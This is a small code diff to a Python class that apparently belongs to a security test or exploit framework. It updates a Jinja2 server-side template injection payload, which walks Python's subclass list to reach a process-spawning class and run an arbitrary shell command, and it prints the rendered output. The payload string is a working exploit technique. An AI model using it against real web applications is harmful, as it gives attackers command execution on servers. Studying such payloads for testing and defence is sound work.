@@ -9,11 +9,13 @@ class JinjaTemplateExploit(ServerSideTemplateInjectionExploit):
     vulnerable_function = jinja2.Template.render
     def generate_payload(command: str) -> str:
         # the index of the class can vary!
-        return f"{{{{''.__class__.__mro__[1].__subclasses__()[426]('{command}',shell=True,stdout=-1).communicate()}}}}"
+        return f"{{{{''.__class__.__base__.__subclasses__()[408]('{command}',shell=True,stdout=-1).communicate()}}}}"
 
     def run_payload(payload: str) -> None:
         template = jinja2.Template(payload)
-        return template.render()
+        res = template.render()
+        print(res)
+        return res
 
 
 
